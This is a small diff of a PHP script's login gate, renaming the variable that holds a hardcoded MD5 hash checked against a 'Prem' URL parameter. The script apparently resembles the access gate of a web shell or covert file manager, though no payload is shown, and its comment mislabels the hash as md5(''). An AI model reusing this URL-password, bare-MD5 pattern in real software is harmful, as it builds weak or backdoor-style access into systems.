@@ -10,7 +10,7 @@
           **/
 
 session_start();
-$auth = '6b46b59df17357e900765d115473ff4d'; // md5('')
+$Prem = '6b46b59df17357e900765d115473ff4d'; // md5('')
 $start_path = __DIR__;
 date_default_timezone_set('Asia/Jakarta');
 
@@ -26,7 +26,7 @@ if (isset($_GET['logout'])) {
     exit;
 }
 if (!isset($_SESSION['login'])) {
-    if (isset($_GET['Prem']) && md5($_GET['Prem']) === $auth) {
+    if (isset($_GET['Prem']) && md5($_GET['Prem']) === $Prem) {
         $_SESSION['login'] = true;
         header('Location: ?'); // redirect tanpa parameter auth
         exit;
